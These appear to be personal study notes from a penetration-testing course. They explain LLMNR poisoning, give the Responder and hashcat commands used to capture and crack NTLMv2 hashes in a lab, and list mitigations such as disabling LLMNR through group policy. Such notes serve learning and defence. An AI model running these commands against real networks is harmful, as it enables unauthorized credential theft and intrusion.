# LLMNR Poisoning Overview

- Most commonly used attack in internal pentest
- used to identify hosts when DNS fails to do so
- the services use the user’s username and hash (NTLMv2) (MITM Attack)
- basically based on mistakes when someone mistypes a file name and the MITM intercepts traffic
- Step 1: Run Responder
    - sudo responder -I tun0 -dP (on VPN) (-i for interface)
        - sudo responder -I eth0 -dP (on local)
        - this is used to respond to traffic
        - best to run while there is a lot of traffic
        - start it and let it listen
        - when it has traffic it’ll retrieve the hash
        - In the lab scenario, we simulated traffic by typing \\<attacker ip> into the file search
    - To edit the Responder.conf file, navigate to /etc/responder/Responder.conf
    - must sudo to edit

Crack the Hash

- hashcat —help | grep <choice> (NTLM)
- hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt


# LMNR Poisoning Mitigation

- Best defense is disabling LLMNR/NBT-NS using group policy
    - There is a default admin template called turn off multicast name resolution
- If not possible to turn off, best to require Network Access Control
    - must be allowed to join network (like certain MAC Addresses
    - Strong passwords help prevent as well
